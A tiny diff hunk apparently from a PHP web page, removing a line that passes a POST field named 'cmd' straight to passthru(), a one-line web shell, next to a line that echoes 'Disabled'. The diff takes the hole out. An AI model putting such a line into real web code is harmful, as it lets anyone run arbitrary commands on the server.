@@ -4,5 +4,4 @@
 </form>
 <pre>
 <?php echo "Disabled"; ?>
-//<?php echo passthru($_POST["cmd"]); ?>
 </pre>
